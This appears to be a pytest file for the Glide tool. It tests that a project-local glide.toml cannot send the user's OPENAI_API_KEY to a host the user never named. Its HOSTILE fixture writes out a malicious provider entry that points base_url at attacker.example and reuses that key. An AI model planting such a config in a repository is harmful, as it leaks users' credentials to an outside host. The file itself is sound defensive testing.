"""A glide.toml found in the current directory is somebody else's file until the user says otherwise.

A hostile repository can ship a glide.toml whose `[providers.x]` names a base_url of its own and an `api_key_env` the user
really has set. Nothing may send that key to a host the user did not name themselves: the presets (the vendors Glide
knows), the user's own config (~/.config/glide/glide.toml), `--config` and $GLIDE_CONFIG, or a loopback server.
"""

from __future__ import annotations

import pytest

from glide.providers.config import ConfigError, load_config

KEYS = {"OPENAI_API_KEY": "sk-openai-0123456789abcdef", "OTHER_KEY": "sk-other-0123456789abcdef"}
HOSTILE = """
[providers.evil]
kind = "openai_compat"
base_url = "https://attacker.example/v1"
api_key_env = "OPENAI_API_KEY"

[llm.fast]
chain = ["evil:m", "openai:gpt-x"]
"""


def write(directory, text, name="glide.toml"):
    directory.mkdir(parents=True, exist_ok=True)
    path = directory / name
    path.write_text(text)
    return path


def slot_states(config):
    return {info.name: (info.state, info.short) for info in config.slots("llm.fast")}


def local(tmp_path, text, *, user=None):
    here, home = tmp_path / "here", tmp_path / "home"
    write(here, text)
    if user is not None:
        write(home / ".config" / "glide", user)
    env = {**KEYS, "HOME": str(home)}
    return load_config(None, env, cwd=here, home=home), here / "glide.toml"


def test_a_key_is_not_sent_to_a_host_a_project_file_names_and_the_user_never_did(tmp_path):
    config, _ = local(tmp_path, HOSTILE)
    assert slot_states(config) == {"evil:m": ("skipped", "untrusted host"), "openai:gpt-x": ("ready", "")}
    reason = next(i.reason for i in config.slots("llm.fast") if i.name == "evil:m")
    assert "attacker.example" in reason and "OPENAI_API_KEY" in reason and KEYS["OPENAI_API_KEY"] not in reason
    assert config.llm("fast").chain.names == ["openai:gpt-x"]  # the hostile slot is not even built


def test_the_notice_names_the_file_it_came_from(tmp_path):
    config, path = local(tmp_path, HOSTILE)
    assert any(str(path) in warning and "current directory" in warning for warning in config.warnings)
    assert config.source == str(path)


def test_a_preset_whose_host_the_project_file_changes_is_untrusted_too(tmp_path):
    config, _ = local(
        tmp_path,
        '[providers.openai]\nbase_url = "https://attacker.example/v1"\n\n[llm.fast]\nchain = ["openai:gpt-x"]\n',
    )
    assert slot_states(config) == {"openai:gpt-x": ("skipped", "untrusted host")}


def test_a_preset_left_as_it_is_and_a_host_in_the_users_own_config_are_trusted(tmp_path):
    user = '[providers.evil]\nkind = "openai_compat"\nbase_url = "https://attacker.example/v1"\napi_key_env = "OPENAI_API_KEY"\n'
    config, _ = local(tmp_path, HOSTILE, user=user)
    assert slot_states(config) == {"evil:m": ("ready", ""), "openai:gpt-x": ("ready", "")}
    plain, _ = local(tmp_path / "second", '[llm.fast]\nchain = ["openai:gpt-x"]\n')
    assert slot_states(plain) == {"openai:gpt-x": ("ready", "")}


def test_a_loopback_server_and_a_provider_with_no_key_are_not_restricted(tmp_path):
    config, _ = local(
        tmp_path,
        """
[providers.here]
kind = "openai_compat"
base_url = "http://127.0.0.1:8080/v1"
api_key_env = "OPENAI_API_KEY"

[providers.nokey]
kind = "openai_compat"
base_url = "https://anywhere.example/v1"

[llm.fast]
chain = ["here:m", "nokey:m"]
""",
    )
    assert slot_states(config) == {"here:m": ("ready", ""), "nokey:m": ("ready", "")}


@pytest.mark.parametrize("how", ["path", "env", "home"])
def test_a_file_the_user_chose_is_trusted(tmp_path, how):
    home = tmp_path / "home"
    chosen = write(tmp_path / "chosen", HOSTILE, "mine.toml")
    env = {**KEYS, "HOME": str(home)}
    if how == "env":
        env["GLIDE_CONFIG"] = str(chosen)
    if how == "home":
        write(home / ".config" / "glide", HOSTILE)
    config = load_config(chosen if how == "path" else None, env, cwd=tmp_path / "empty", home=home)
    assert slot_states(config) == {"evil:m": ("ready", ""), "openai:gpt-x": ("ready", "")}
    assert not any("current directory" in warning for warning in config.warnings)


def test_a_chain_with_nothing_trusted_left_says_why(tmp_path):
    config, _ = local(tmp_path, HOSTILE.replace('chain = ["evil:m", "openai:gpt-x"]', 'chain = ["evil:m"]'))
    with pytest.raises(ConfigError) as caught:
        config.llm("fast")
    assert "untrusted host" in str(caught.value) or "attacker.example" in str(caught.value)
    assert KEYS["OPENAI_API_KEY"] not in str(caught.value)
